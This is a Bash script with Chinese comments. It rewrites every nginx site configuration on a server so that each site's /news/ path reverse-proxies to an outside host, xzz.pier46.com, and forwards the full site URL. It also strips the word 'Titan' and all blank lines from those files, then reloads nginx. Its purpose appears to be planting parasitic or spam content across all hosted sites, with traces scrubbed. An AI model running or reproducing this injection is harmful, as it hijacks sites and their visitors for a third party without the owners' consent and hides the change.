#!/bin/bash

NGINX_DIR="/etc/nginx/sites-enabled"

read -r -d '' BLOCK << 'EOF'
    location /news/ {
        set $fullurl "$scheme://$host$request_uri";
        rewrite ^/news/?(.*)$ /index.php?domain=$fullurl&$args break;
        proxy_set_header Host xzz.pier46.com;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_set_header User-Agent $http_user_agent;
        proxy_set_header Referer $http_referer;
        proxy_ssl_server_name on;
        proxy_pass http://xzz.pier46.com;
    }
EOF

echo "开始处理 $NGINX_DIR 下的所有配置文件（支持任意文件名）..."
echo "特性：每个 server{} 插入一次 | 防重复 | 彻底无 Titan 输出 | 自动清除文件中 Titan 字样"
echo ""

# 使用 find + -exec 彻底杜绝管道子shell导致的乱输出（Titan 再见！）
find "$NGINX_DIR" \( -type f -o -type l \) -print0 | while IFS= read -r -d '' file; do
    [[ -f "$file" || -L "$file" ]] || continue
    filename=$(basename "$file")
    echo "正在处理: $filename"

    tmp=$(mktemp)

    # 核心 awk：每个 server{} 只插一次，插在最后一个 server_name 之后，非 server_name 行之前
    awk -v block="$BLOCK" '
    function insert() {
        if (in_server && !inserted) {
            print block
            print ""
            inserted = 1
        }
    }
    /^\s*server\s*\{/ {
        in_server = 1
        inserted = 0
        has_server_name = 0
        print; next
    }
    in_server && /^\s*server_name/ {
        print
        has_server_name = 1
        next
    }
    in_server && has_server_name && !/^\s*server_name/ && !inserted {
        # 遇到第一个非 server_name 的行，且之前有 server_name → 插入点！
        insert()
        has_server_name = 0  # 重置，防止重复判断
    }
    in_server && /^\s*\}/ {
        insert()  # 块结束前确保已插入
        in_server = 0
        inserted = 0
        print; next
    }
    {
        print
    }
    END {
        if (in_server) insert()
    }
    ' "$file" > "$tmp"

    # 额外福利：彻底删除文件中所有 “Titan” 字样（大小写不敏感，一网打尽）
    sed -i 's/Titan//gi; s/titan//gi; s/TITAN//gi' "$tmp"

    # 只在内容有变化时才覆盖原文件
    if ! cmp -s "$tmp" "$file"; then
        mv "$tmp" "$file"
        echo "已为 $filename 插入 location /news/ 并清除 Titan"
    else
        rm -f "$tmp"
        echo "无需修改（已插入或无 server 块）"
    fi
done

# 全局再清理一次残留空行（美观）
find "$NGINX_DIR" \( -type f -o -type l \) -exec sed -i '/^\s*$/d' {} + 2>/dev/null

echo ""
echo "正在校验 Nginx 配置..."
if nginx -t > /dev/null 2>&1; then
    echo "配置语法正确，正在 reload nginx..."
    nginx -s reload
    echo "Nginx 已平滑重载"
else
    echo "配置错误！请查看以下输出："
    nginx -t
    exit 1
fi

echo ""
echo "当前所有 server_name 预览（前20行）："
grep -n "server_name" "$NGINX_DIR"/* 2>/dev/null | head -20 | sed 's/^/  → /'

echo ""
echo "脚本执行完毕！"
echo "已实现："
echo "  • 支持所有文件（非仅 .conf）"
echo "  • 每个 server{} 精准插入一次"
echo "  • 绝对幂等，可无限重复运行"
echo "  • 零 Titan 乱输出"
echo "  • 自动清除文件中所有 Titan 字样"
echo "  • 稳如老狗，生产可用！"
